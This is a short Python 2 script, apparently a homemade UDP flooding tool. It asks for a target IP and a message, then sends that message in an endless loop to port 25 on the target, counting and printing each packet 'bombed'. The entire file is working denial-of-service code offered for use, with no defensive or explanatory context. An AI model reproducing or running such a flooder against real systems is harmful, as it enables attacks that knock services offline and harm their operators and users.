#!usr/bin/env python

import os
import sys
import socket


getrekt= raw_input("Enter target IP: ")
portrekt = 25
lastwreck = raw_input("Message to send: ")

print "Bombing UDP packets %s on port %s" % (getrekt, portrekt)

sent = 0

while True:

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(lastwreck, (getrekt, portrekt))
    sent = sent + 1
    print "Sent %s UDP packets against %s on port %s" % (sent, getrekt, portrekt)
